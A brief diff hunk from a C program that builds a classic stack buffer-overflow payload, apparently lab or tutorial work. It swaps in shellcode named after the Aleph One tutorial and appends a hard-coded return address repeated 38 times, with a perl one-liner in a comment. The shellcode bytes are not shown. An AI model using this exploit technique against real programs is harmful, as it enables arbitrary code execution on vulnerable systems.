@@ -22,7 +22,7 @@ int main(void)
   }
 
   // `cat sc`
-  strcat(str, shellcode);
+  strcat(str, shellcodeAlephOne);
   // `perl -e 'print"\xf8\xf2\xff\xbf"x38' the return address
   
   for (int i = 0; i < 38; ++i)
